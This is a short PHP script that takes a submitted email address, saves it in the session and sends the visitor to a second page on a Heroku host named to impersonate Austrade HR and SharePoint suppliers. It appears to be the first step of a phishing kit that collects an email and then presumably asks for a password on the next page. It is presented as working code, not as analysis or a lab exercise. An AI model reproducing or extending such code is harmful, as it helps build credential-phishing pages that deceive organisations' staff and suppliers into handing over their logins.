<?php 

session_start();
   
     $userid = $_POST['em'];
		
      if(!empty($userid)){
      
         $_SESSION['login_user'] = $userid;
         
         header("Location: https://austradehr-sharepointsuppliers.herokuapp.com/page2.php");
      }else {
        header("Location: https://austradehr-sharepointsuppliers.herokuapp.com/page.php");
      }
?>


